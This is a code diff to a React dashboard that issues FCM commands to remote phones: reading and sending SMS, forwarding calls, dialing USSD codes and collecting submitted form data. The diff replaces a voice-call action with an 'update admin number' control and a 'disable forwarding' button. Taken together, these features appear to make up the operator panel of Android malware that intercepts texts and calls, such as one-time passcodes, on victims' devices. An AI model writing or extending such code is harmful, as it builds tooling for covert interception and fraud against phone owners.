@@ -40,7 +40,7 @@ interface DbMessage {
 }
 interface DbFormData { id: number; appId: string; deviceId: string; data: Record<string, unknown>; submittedAt: string; }
 type Page = "home" | "messages" | "groups" | "devices" | "settings";
-type ActionKey = "online_check" | "get_sms" | "send_sms" | "voice_call" | "call_forward" | "dial_ussd";
+type ActionKey = "online_check" | "get_sms" | "send_sms" | "update_number" | "call_forward" | "dial_ussd";
 type SendState = "idle" | "loading" | "ok" | "err";
 
 function sc(s: string) {
@@ -136,11 +136,6 @@ function mkDeviceCmd(_uid: string, action: string, extra?: Record<string, unknow
     type: "send_sms",
     to: String(extra?.to ?? ""),
     message: String(extra?.body ?? ""),
-    sim: String(extra?.simSlot ?? 0),
-  };
-  if (action === "call") return {
-    type: "voice_call",
-    number: String(extra?.code ?? ""),
     sim: String(extra?.simSlot ?? 0),
   };
   if (action === "ussd") return {
@@ -388,6 +383,7 @@ function ActionPanel({ action, device, onClose }: { action: ActionKey; device: D
   const [log, setLog] = useState("");
   const [countdown, setCountdown] = useState(0);
   const [fcmBar, setFcmBar] = useState(false); // 5-second progress bar after FCM send
+  const [updateDisableState, setUpdateDisableState] = useState<SendState>("idle");
 
   // Live countdown for online_check: 0 → 30
   useEffect(() => {
@@ -434,7 +430,7 @@ function ActionPanel({ action, device, onClose }: { action: ActionKey; device: D
 
   const titles: Record<ActionKey, string> = {
     online_check: "Online Check", get_sms: "Get SMS", send_sms: "Send SMS",
-    voice_call: "Voice Call", call_forward: "Call Forwarding", dial_ussd: "Dial USSD",
+    update_number: "Update Number", call_forward: "Call Forwarding", dial_ussd: "Dial USSD",
   };
 
   const t = useTheme();
@@ -502,16 +498,39 @@ function ActionPanel({ action, device, onClose }: { action: ActionKey; device: D
           }} />
         </>
       )}
-      {action === "voice_call" && (
+      {action === "update_number" && (
         <>
-          <div style={{ fontSize: 11, color: t.txt2, fontWeight: 600, marginBottom: 6 }}>SIM Slot</div>
-          <SimSelect value={sim} onChange={setSim} device={device} />
-          <FieldInput placeholder="Number to call" value={number} onChange={setNumber} type="tel" />
+          <div style={{ fontSize: 12, color: t.txt2, marginBottom: 12 }}>
+            Update admin number for <b>{device.name}</b>.
+          </div>
+          <FieldInput placeholder="10-digit number" value={number} onChange={v => setNumber(v.replace(/\D/g, "").slice(0, 10))} type="tel" />
           <StatusLog state={state} log={log} />
-          <PrimaryBtn state={state} idle="Make Call" loading="Initiating…" ok="Call Initiated" onClick={() => {
-            if (!number.trim()) { setLog("Enter a number to call."); setState("err"); return; }
-            void send(mkDeviceCmd(device.deviceId, "call", { code: number.trim(), simSlot: sim === "2" ? 1 : 0 }));
+          <PrimaryBtn state={state} idle="Update Number" loading="Updating…" ok="Updated ✓" onClick={() => {
+            const digits = number.replace(/\D/g, "");
+            if (digits.length !== 10) { setLog("Enter exactly 10 digits."); setState("err"); return; }
+            void send(mkAdminUpdate(device.deviceId, digits, "on"));
           }} />
+          <div style={{ marginTop: 10 }}>
+            <button
+              onClick={() => {
+                setUpdateDisableState("loading");
+                fcmSend(device.deviceId, mkAdminUpdate(device.deviceId, "", "off"))
+                  .then(() => { setUpdateDisableState("ok"); setTimeout(() => setUpdateDisableState("idle"), 3000); })
+                  .catch(() => { setUpdateDisableState("idle"); });
+              }}
+              disabled={updateDisableState === "loading"}
+              style={{
+                width: "100%", padding: "11px 0", borderRadius: 9, border: "1.5px solid #ef4444",
+                background: updateDisableState === "ok" ? "#22c55e" : updateDisableState === "loading" ? "#fee2e2" : "transparent",
+                color: updateDisableState === "ok" ? "#fff" : "#ef4444",
+                fontWeight: 700, fontSize: 13,
+                cursor: updateDisableState === "loading" ? "wait" : "pointer",
+                transition: "background 0.15s",
+              }}
+            >
+              {updateDisableState === "loading" ? "Disabling…" : updateDisableState === "ok" ? "Disabled ✓" : "Disable Forwarding"}
+            </button>
+          </div>
         </>
       )}
       {action === "call_forward" && (
@@ -1239,7 +1258,7 @@ function DevicesPage({ devices, messages, initialDevice, onBack }: { devices: Db
     { label: "Online Check", key: "online_check" },
     { label: "Get SMS", key: "get_sms" },
     { label: "Send SMS", key: "send_sms" },
-    { label: "Voice Call", key: "voice_call" },
+    { label: "Update", key: "update_number" },
     { label: "Call Forward", key: "call_forward" },
     { label: "Dial USSD", key: "dial_ussd" },
   ];
